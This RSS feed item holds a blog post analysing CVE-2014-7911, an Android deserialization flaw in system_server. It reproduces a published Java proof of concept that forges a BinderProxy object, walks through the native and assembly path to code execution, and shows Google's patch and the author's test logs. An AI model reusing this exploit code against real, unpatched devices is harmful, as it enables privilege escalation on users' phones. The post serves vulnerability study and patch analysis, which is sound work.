<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Vulnerability on Zeqi&#39;s Blog</title>
    <link>https://zeqiii.github.io/tags/vulnerability/</link>
    <description>Recent content in Vulnerability on Zeqi&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-EN</language>
    <managingEditor>zeqiii@163.com (zeqi)</managingEditor>
    <webMaster>zeqiii@163.com (zeqi)</webMaster>
    <copyright>(c) 2016 zeqi</copyright>
    <lastBuildDate>Mon, 29 Feb 2016 16:34:11 +0800</lastBuildDate>
    <atom:link href="https://zeqiii.github.io/tags/vulnerability/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Analysis of cve-2014-7911</title>
      <link>https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/</link>
      <pubDate>Mon, 29 Feb 2016 16:34:11 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/</guid>
      <description>

&lt;h2 id=&#34;a-brief-look&#34;&gt;A brief look&lt;/h2&gt;

&lt;p&gt;System_server is a process has &lt;strong&gt;system&lt;/strong&gt; permission, to which one can send any serializable data. Although system_server won&amp;rsquo;t invoke any functions of the received objected, but &lt;code&gt;finalize&lt;/code&gt; will be called when &lt;strong&gt;GC&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Function &lt;code&gt;finalize&lt;/code&gt; in &lt;code&gt;android.os.BinderProxy&lt;/code&gt; calls a native function which has pointers, the pointers may be controlled by attackers. So &lt;strong&gt;GC&lt;/strong&gt; may result in arbitrary code execution. &lt;code&gt;android.os.BinderProxy&lt;/code&gt; isn&amp;rsquo;t serializable, however, java.io.ObjectInputStream doesn&amp;rsquo;t check whether an object really is serializable, attackers can craft a fake BinderProxy to acheive the goals.
As other one&amp;rsquo;s blog says:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;ObjectInputStream doesn&amp;rsquo;t validate that the serialized object&amp;rsquo;s class type, as described in the serialized object, is actually serializable. It creates an instance of the wanted class anyway with the deserialized values of the object. Therefore, one can create object of any class, and control its private variables, by serializing objects from another class, that would be deserialized as data members of the wanted class.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;poc&#34;&gt;POC&lt;/h2&gt;

&lt;p&gt;Let&amp;rsquo;s just see the POC written by &lt;strong&gt;Jann Horn&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;AAdroid.os.BinderProxy.java&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class BinderProxy implements Serializable {
   private static final long serialVersionUID = 0;
   //public long mObject = 0x1337beef;
   //public long mOrgue = 0x1337beef;
   private int mObject = 0x1337beef;
   private int mOrgue = 0x1337beef;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Partial code of MainActivity.java&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// Put the fake BinderProxy object into a Bundle
Bundle b = new Bundle();
AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();
b.putSerializable(&amp;quot;eatthis&amp;quot;, evilProxy);

// Get IUserManager using reflection
Class clIUserManager = Class.forName(&amp;quot;android.os.IUserManager&amp;quot;);
// Get inner class Stub from IUserManager
Class[] umSubclasses = clIUserManager.getDeclaredClasses();
Class clStub = null;
for (Class c: umSubclasses) {
    if (c.getCanonicalName().equals(&amp;quot;android.os.IUserManager.Stub&amp;quot;)) {
        clStub = c;
    }
}
// Get the field &amp;quot;TRANSACTION_setApplicationRestrictions&amp;quot;
Field fTRANSACTION_setApplicationRestrictions = clStub.getDeclaredField(&amp;quot;TRANSACTION_setApplicationRestrictions&amp;quot;);
fTRANSACTION_setApplicationRestrictions.setAccessible(true);
TRANSACTION_setApplicationRestrictions = fTRANSACTION_setApplicationRestrictions.getInt(null);

// Get UserManager
UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);
// mService is a field of UserManager, its type is IUserManager
Field fService = UserManager.class.getDeclaredField(&amp;quot;mService&amp;quot;);
fService.setAccessible(true);
// Get mService from UserManager
Object proxy = fService.get(um);

// Get Stub.Proxy from clStub
Class[] stSubclasses = clStub.getDeclaredClasses();
clProxy = null;
for (Class c: stSubclasses) {
    if (c.getCanonicalName().equals(&amp;quot;android.os.IUserManager.Stub.Proxy&amp;quot;)) {
        clProxy = c;
    }
}
// Get field mRemote from Proxy
Field fRemote = clProxy.getDeclaredField(&amp;quot;mRemote&amp;quot;);
fRemote.setAccessible(true);
mRemote = (IBinder) fRemote.get(proxy);
UserHandle me = android.os.Process.myUserHandle();

// Triggr it!
setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Implementation of setApplicationRestrictions&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// This function modifies the Bundle, marshalling it, find &amp;quot;AAdr&amp;quot; and changing it to &amp;quot;andr&amp;quot;, so the class description becomes &amp;quot;android.os.BinderProxy&amp;quot;
public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int userHandle) throws android.os.RemoteException 
{ 
    android.os.Parcel _data = android.os.Parcel.obtain(); 
    android.os.Parcel _reply = android.os.Parcel.obtain(); 
    try { 
        _data.writeInterfaceToken(DESCRIPTOR); 
        _data.writeString(packageName); 
        _data.writeInt(1); 
        restrictions.writeToParcel(_data, 0); 
        _data.writeInt(userHandle); 
        byte[] data = _data.marshall(); 
        for (int i=0; true; i++) { 
            if (data[i] == &#39;A&#39; &amp;amp;&amp;amp; data[i+1] == &#39;A&#39; &amp;amp;&amp;amp; data[i+2] == &#39;d&#39; &amp;amp;&amp;amp; data[i+3] == &#39;r&#39;) { 
                data[i] = &#39;a&#39;; 
                data[i+1] = &#39;n&#39;; 
                break; 
            } 
        } 
        _data.recycle(); 
        _data = Parcel.obtain(); 
        _data.unmarshall(data, 0, data.length); 
        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0); 
        _reply.readException(); 
    } 
    finally { 
        _reply.recycle(); 
        _data.recycle(); 
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From the POC we know that a fake object is created and put into a bundle. It&amp;rsquo;s &lt;code&gt;mObject&lt;/code&gt; and &lt;code&gt;mOrgue&lt;/code&gt; is under attacker&amp;rsquo;s controll and can be set to any values. In function &lt;code&gt;setApplicationRestrictions()&lt;/code&gt;, the bundle object is written to a parcel using &lt;code&gt;restrictions.writeToParcel()&lt;/code&gt;. After the parcel marshalled to a byte array, a loop appears to find string &lt;code&gt;AAdr&lt;/code&gt;, and change &lt;code&gt;AA&lt;/code&gt; to &lt;code&gt;an&lt;/code&gt;. Thus, &lt;code&gt;AAdroid.os.BinderProxy&lt;/code&gt; finally becomes &lt;code&gt;android.os.BinderProxy&lt;/code&gt;. When &lt;code&gt;java.io.ObjectInputStream&lt;/code&gt; deserializes this object, a &lt;code&gt;android.os.BinderProxy&lt;/code&gt; object will be created. In this way, attackers can create any object and set the field value as they want.&lt;/p&gt;

&lt;h2 id=&#34;why-binderproxy&#34;&gt;Why BinderProxy?&lt;/h2&gt;

&lt;p&gt;So why attackers choose &lt;code&gt;android.os.BinderProxy&lt;/code&gt;? Here is the source code of it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;protected void finalize() throws Throwable {
	destroy();
	super.finalize();
	return;
	Exception exception;
	exception;
	super.finalize();
	throw exception;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;finalize()&lt;/code&gt; method will call a native method &lt;code&gt;distroy()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static void android_os_BinderProxy_destroy(JNIEnv* env, jobject obj) {
    IBinder* b = (IBinder*)
            env-&amp;gt;GetIntField(obj, gBinderProxyOffsets.mObject);
    DeathRecipientList* drl = (DeathRecipientList*)
            env-&amp;gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);
    LOGDEATH(&amp;quot;Destroying BinderProxy %p: binder=%p drl=%p\n&amp;quot;, obj, b, drl);
    env-&amp;gt;SetIntField(obj, gBinderProxyOffsets.mObject, 0);
    env-&amp;gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, 0);
    drl-&amp;gt;decStrong((void*)javaObjectForIBinder);
    b-&amp;gt;decStrong((void*)javaObjectForIBinder);
    IPCThreadState::self()-&amp;gt;flushCommands();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the above method, &lt;code&gt;mOrgue&lt;/code&gt; is regarded as a pointer of &lt;code&gt;DeathRecipientList&lt;/code&gt;, assigned to &lt;code&gt;drl&lt;/code&gt;. Then &lt;code&gt;drl-&amp;gt;decStrong()&lt;/code&gt; is invoked.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void RefBase::decStrong(const void* id) const {
    weakref_impl* const refs = mRefs;
    refs-&amp;gt;removeStrongRef(id);
    const int32_t c = android_atomic_dec(&amp;amp;refs-&amp;gt;mStrong);
#if PRINT_REFS
    ALOGD(&amp;quot;decStrong of %p from %p: cnt=%d\n&amp;quot;, this, id, c);
#endif
    ALOG_ASSERT(c &amp;gt;= 1, &amp;quot;decStrong() called on %p too many times&amp;quot;, refs);
    if (c == 1) {
        refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);
        if ((refs-&amp;gt;mFlags&amp;amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) {
            delete this;
        }
    }
    refs-&amp;gt;decWeak(id);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;According to other&amp;rsquo;s blog, &lt;code&gt;refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);&lt;/code&gt; will eventually causes arbitrary code execution. Below is the assembly code sceenshot from &lt;a href=&#34;http://wooyun.org/&#34;&gt;wooyun.org&lt;/a&gt;, attacker controlls r0 (&lt;code&gt;this&lt;/code&gt; pointer).&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/assembly.png&#34; alt=&#34;Image of assembly&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;weakref_impl* const refs = mRefs;
refs-&amp;gt;removeStrongRef(id);
const int32_t c = android_atomic_dec(&amp;amp;refs-&amp;gt;mStrong);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Transferred to assembly is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;ldr     r4, [r0, #4]   ; attacker controls r0 also r4
mov     r6, r1
mov     r0, r4
blx     &amp;lt;android_atomic_dec ()&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;if (c == 1) {
	refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Transferred to assembly is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;cmp     r0, #1
bne.n   d1ea
ldr     r0, [r4, #8]  ; attacker controls r4 also r0
mov     r1, r6
ldr     r3, [r0, #0]  ; attacker controls r0 also r3
ldr     r2, [r3, #12] ; attacker controls r3 also r2
blx     r2            ; execute code pointed by r2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If everything goes smoothly, the code pointed by r2 will be executed.&lt;/p&gt;

&lt;h2 id=&#34;key-point-one-how-aadroid-os-binderproxy-becomes-android-os-binderproxy&#34;&gt;Key Point One: How AAdroid.os.BinderProxy Becomes android.os.BinderProxy&lt;/h2&gt;

&lt;p&gt;Firstly, a fake BinderProxy object is put into a Bundle. Look into android source code, we can find:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Function &lt;code&gt;putSerializable()&lt;/code&gt; puts the fake object into &lt;code&gt;Bundle.mMap&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Then the Bundle object is written to a parcel.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;writeToParcel()&lt;/code&gt; calls &lt;code&gt;writeArrayMapInternal()&lt;/code&gt;, write the data in &lt;code&gt;mMap&lt;/code&gt; to parcel.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;writeArrayMapInternal()&lt;/code&gt; calls &lt;code&gt;writeValue(Object v)&lt;/code&gt;, to write the value of &lt;code&gt;mMap&lt;/code&gt; into parcel. If the value is an instance of &lt;code&gt;Serializable&lt;/code&gt;, it calls &lt;code&gt;writeSerializable(Serializable serial)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;In android 4.4.2, &lt;code&gt;writeSerializable()&lt;/code&gt; is implemented as below. It uses &lt;code&gt;ObjectOutputStream&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public final void writeSerializable(Serializable s) {
    if (s == null) {
        writeString(null);
        return;
    }
    String name = s.getClass().getName();
    writeString(name);
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    try {
        // Output flat
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(s);
        oos.close();
        writeByteArray(baos.toByteArray());
    } catch (IOException ioe) {
        throw new RuntimeException(&amp;quot;Parcelable encountered &amp;quot; +
            &amp;quot;IOException writing serializable object (name = &amp;quot; + name +
            &amp;quot;)&amp;quot;, ioe);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;**Then the POC uses &lt;code&gt;Parcel.marshall()&lt;/code&gt; to get a byte array and modify its content, changing &lt;code&gt;AA&lt;/code&gt; to &lt;code&gt;an&lt;/code&gt;. **&lt;/p&gt;

&lt;p&gt;Then &lt;code&gt;unmarshall()&lt;/code&gt; this array to get a new parcel object and send to system_server.&lt;/p&gt;

&lt;h2 id=&#34;key-point-two-how-it-is-triggered&#34;&gt;Key Point Two: How it is triggered&lt;/h2&gt;

&lt;p&gt;Once system_server receive a parcel object from &lt;code&gt;Stub&lt;/code&gt;, function &lt;code&gt;onTransact()&lt;/code&gt; takes the responsibility for reading data from parcel. The bundle will be restore by &lt;code&gt;Parcel.readBundle()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public final Bundle readBundle(ClassLoader loader) {
    int length = readInt();
    if (length &amp;lt; 0) {
        ... /* omitted */
    }    
    final Bundle bundle = new Bundle(this, length);
    if (loader != null) {
        bundle.setClassLoader(loader);
    }
    return bundle;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Constructor &lt;code&gt;Bundle(Parcel, int)&lt;/code&gt; init &lt;code&gt;Bundle.mParcelledData&lt;/code&gt;, which can be parsed into &lt;code&gt;Bundle.mMap&lt;/code&gt; by &lt;code&gt;unparcel()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Fake object is get out by fucntion &lt;code&gt;Bundle.getSerializable()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public Serializable getSerializable(String key) {
    unparcel();
    Object o = mMap.get(key);
    if (o == null) {
        return null;
    }
    try {
        return (Serializable) o;
    } catch (ClassCastException e) {
        typeWarning(key, o, &amp;quot;Serializable&amp;quot;, e);
        return null;
    }
}

synchronized void unparcel() {
        
    /* omitted */

    mParcelledData.readArrayMapInternal(mMap, N, mClassLoader);
    mParcelledData.recycle();
    mParcelledData = null;
}

// when readArrayMapInternal encounters a serializable type, it invokes readSerializable()
public final Serializable readSerializable() {
    String name = readString();
    if (name == null) {
        /* omitted */
    }

    byte[] serializedData = createByteArray();
    ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
    try {
        ObjectInputStream ois = new ObjectInputStream(bais);
        /* Problems exist here, an mal-formed BinderProxy obj will be created. */
        /* When GC, the vulnerability is triggered */
        return (Serializable) ois.readObject();
    } catch (IOException ioe) {
        /* omitted */
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;google-s-patch&#34;&gt;Google&amp;rsquo;s Patch&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;+    public Class&amp;lt;?&amp;gt; checkAndGetTcObjectClass() throws InvalidClassException {
+        // We check some error possibilities that might cause problems later.
+        boolean wasSerializable = (flags &amp;amp; ObjectStreamConstants.SC_SERIALIZABLE) != 0;
+        boolean wasExternalizable = (flags &amp;amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != 0;
+        if (wasSerializable == wasExternalizable) {
+            throw new InvalidClassException(
+                    getName() + &amp;quot; stream data is corrupt: SC_SERIALIZABLE=&amp;quot; + wasSerializable
+                            + &amp;quot; SC_EXTERNALIZABLE=&amp;quot; + wasExternalizable
+                            + &amp;quot;, classDescFlags must have one or the other&amp;quot;);
+        }
+
+        // TC_ENUM is handled elsewhere. See checkAndGetTcEnumClass().
+        if (isEnum()) {
+            throw new InvalidClassException(
+                    getName() + &amp;quot; local class is incompatible: Local class is an enum, streamed&amp;quot;
+                            + &amp;quot; data is tagged with TC_OBJECT&amp;quot;);
+        }
+
+        // isSerializable() is true if the local class implements Serializable. Externalizable
+        // classes are also Serializable via inheritance.
+        if (!isSerializable()) {
+            throw new InvalidClassException(getName() + &amp;quot; local class is incompatible: Not&amp;quot;
+                    + &amp;quot; Serializable&amp;quot;);
+        }
+
+        // The stream class was externalizable, but is only serializable locally.
+        if (wasExternalizable != isExternalizable()) {
+            throw new InvalidClassException(
+                    getName() + &amp;quot; local class is incompatible: Local class is Serializable, stream&amp;quot;
+                            + &amp;quot; data requires Externalizable&amp;quot;);
+        }
+
+        // The following are left unchecked and thus are treated leniently at this point.
+        // SC_BLOCK_DATA may be set iff SC_EXTERNALIZABLE is set AND version 2 of the protocol is in
+        // use.
+        // SC_ENUM should not be set.
+
+        return forClass();
+    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;More information in detail, see &lt;a href=&#34;https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2&#34;&gt;android.googlesource.com&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;my-experiment&#34;&gt;My Experiment&lt;/h2&gt;

&lt;h3 id=&#34;one-demo-on-hongmi-android-4-2&#34;&gt;One: Demo on HongMi (android 4.2)&lt;/h3&gt;

&lt;p&gt;I write two apks, a client and a server.&lt;/p&gt;

&lt;p&gt;Client represents the attacker, server represents a system_server. The things client does are the same as POC. Partial of the server&amp;rsquo;s code is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class ServiceImpl extends MyService.Stub {
    @Override
    public void setApplicationRestrictions(String packageName, Bundle restrictions, int userHandler) throws RemoteException {
        Log.e(&amp;quot;remote&amp;quot;, packageName);
        Object obj = restrictions.get(&amp;quot;eathis&amp;quot;);
        Log.e(&amp;quot;remote&amp;quot;, obj.getClass().getName());
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running client doesn&amp;rsquo;t cause a crash of the phone, but the exceptions below:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;03-02 11:21:20.802 4855-4866/cn.ac.iie.cve20147911_server E/remote: test
03-02 11:21:20.815 4855-4866/cn.ac.iie.cve20147911_server E/JavaBinder: *** Uncaught remote exception!  (Exceptions are not yet supported across processes.)
    java.lang.RuntimeException: Parcelable encountered IOException reading a Serializable object (name = AAdroid.os.BinderProxy)
    at android.os.Parcel.readSerializable(Parcel.java:2144)
    at android.os.Parcel.readValue(Parcel.java:2016)
    at android.os.Parcel.readMapInternal(Parcel.java:2226)
    at android.os.Bundle.unparcel(Bundle.java:223)
    at android.os.Bundle.get(Bundle.java:282)
    at cn.ac.iie.cve20147911_server.ServiceImpl.setApplicationRestrictions(ServiceImpl.java:17)
    at cn.ac.iie.cve20147911_server.MyService$Stub.onTransact(MyService.java:61)
    at android.os.Binder.execTransact(Binder.java:351)
    at dalvik.system.NativeStart.run(Native Method)
    Caused by: java.io.InvalidClassException: android.os.BinderProxy local class is incompatible: Not Serializable
        at java.io.ObjectStreamClass.checkAndGetTcObjectClass(ObjectStreamClass.java:1330)
        at java.io.ObjectInputStream.readNewObject(ObjectInputStream.java:1818)
        at java.io.ObjectInputStream.readNonPrimitiveContent(ObjectInputStream.java:787)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:2013)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:1970)
        at android.os.Parcel.readSerializable(Parcel.java:2142)
        at android.os.Parcel.readValue(Parcel.java:2016) 
        at android.os.Parcel.readMapInternal(Parcel.java:2226) 
        at android.os.Bundle.unparcel(Bundle.java:223) 
        at android.os.Bundle.get(Bundle.java:282) 
        at cn.ac.iie.cve20147911_server.ServiceImpl.setApplicationRestrictions(ServiceImpl.java:17) 
        at cn.ac.iie.cve20147911_server.MyService$Stub.onTransact(MyService.java:61) 
        at android.os.Binder.execTransact(Binder.java:351) 
        at dalvik.system.NativeStart.run(Native Method) 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From the call stack, we conclude that the analysis we did before are right, and HongMi&amp;rsquo;s system is patched because there is an exception raised from fucntion &lt;code&gt;ObjectStreamClass.checkAndGetTcObjectClass()&lt;/code&gt; which is added in the patch. Notice that &lt;code&gt;android.os.BinderProxy&lt;/code&gt; appears on the exception.&lt;/p&gt;

&lt;h3 id=&#34;demo-on-huawei-android-4-1&#34;&gt;Demo on HuaWei (android 4.1)&lt;/h3&gt;

&lt;p&gt;Do the same thing on an HuaWei phone, the second exception disappeared!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;03-02 14:37:00.357 31139-31154/cn.ac.iie.cve20147911_server E/remote: test
03-02 14:37:00.360 31139-31154/cn.ac.iie.cve20147911_server E/JavaBinder: *** Uncaught remote exception!  (Exceptions are not yet supported across processes.)
    java.lang.ClassCastException: android.os.BinderProxy cannot be cast to java.io.Serializable
    at android.os.Parcel.readSerializable(Parcel.java:2142)
    at android.os.Parcel.readValue(Parcel.java:2016)
    at android.os.Parcel.readMapInternal(Parcel.java:2226)
    at android.os.Bundle.unparcel(Bundle.java:223)
    at android.os.Bundle.get(Bundle.java:282)
    at cn.ac.iie.cve20147911_server.ServiceImpl.setApplicationRestrictions(ServiceImpl.java:17)
    at cn.ac.iie.cve20147911_server.MyService$Stub.onTransact(MyService.java:61)
    at android.os.Binder.execTransact(Binder.java:367)
    at dalvik.system.NativeStart.run(Native Method)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This exception is just a ClassCastException, which means android.os.BinderProxy has been created, it just can&amp;rsquo;t be casted to java.io.Serializable.&lt;/p&gt;

&lt;h3 id=&#34;debugging&#34;&gt;Debugging&lt;/h3&gt;

&lt;p&gt;Set a breakpoint in our simulated system-server at this line:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/cvebreakpoint.png&#34; alt=&#34;breakpoint screenshot&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Attach debugger to the process and follow the steps analyzed before, we can track the exucetion to &lt;code&gt;Parcel.readSerializable()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/readserializable.png&#34; alt=&#34;breakpoint readSerializable()&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ois.readObject()&lt;/code&gt; suppose to create a android.os.BinderProxy object with its &lt;code&gt;mOrgue&lt;/code&gt; and &lt;code&gt;mObject&lt;/code&gt; set to &lt;code&gt;0x1337beef&lt;/code&gt;, but because of the exception &lt;code&gt;ClassCastException&lt;/code&gt;, tracking will break and debugger will stop there, so that we can&amp;rsquo;t see the result. In order to track the result of &lt;code&gt;ois.readObject()&lt;/code&gt;, I use Xposed to hook &lt;code&gt;Parcel.readSerializable()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class HookParcel implements IXposedHookLoadPackage {
    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
        findAndHookMethod(
                &amp;quot;android.os.Parcel&amp;quot;,
                loadPackageParam.classLoader,
                &amp;quot;readSerializable&amp;quot;,
                new XC_MethodHook() {
                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                        Parcel parcel = (Parcel) param.thisObject;
                        String name = parcel.readString();
                        if (name == null) {
                            param.setResult(null);
                        } else {
                            byte[] serializedData = parcel.createByteArray();
                            ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
                            ObjectInputStream ois = new ObjectInputStream(bais);
                            Object obj = ois.readObject();
                            XposedBridge.log(name);
                            if (name.equals(&amp;quot;AAdroid.os.BinderProxy&amp;quot;)) {
                                XposedBridge.log(obj.getClass().getName());
                                if (obj.getClass().getName().equals(&amp;quot;android.os.BinderProxy&amp;quot;)) {
                                    Class clz = obj.getClass();
                                    Field mOrgue = clz.getDeclaredField(&amp;quot;mOrgue&amp;quot;);
                                    Field mObject = clz.getDeclaredField(&amp;quot;mObject&amp;quot;);
                                    mObject.setAccessible(true);
                                    mOrgue.setAccessible(true);
                                    int v_mObject = mObject.getInt(obj);
                                    int v_mOrgue = mOrgue.getInt(obj);
                                    XposedBridge.log(&amp;quot;mObject:&amp;quot; + v_mObject);
                                    XposedBridge.log(&amp;quot;mOrgue:&amp;quot; + v_mOrgue);
                                }
                            }
                            param.setResult((Serializable) obj);
                        }
                    }
                }

        );
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The hook does the same things as the original method, except printing some information we are interested in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/xposedlog.png&#34; alt=&#34;xposed log&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;problems&#34;&gt;Problems&lt;/h2&gt;

&lt;p&gt;I still haven&amp;rsquo;t triggered a reboot on a phone. I&amp;rsquo;ll continue working on this.&lt;/p&gt;

&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;

&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://seclists.org/fulldisclosure/2014/Nov/51&#34;&gt;http://seclists.org/fulldisclosure/2014/Nov/51&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&#34;&gt;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;&gt;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://drops.wooyun.org/mobile/6082&#34;&gt;http://drops.wooyun.org/mobile/6082&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
  </channel>
</rss>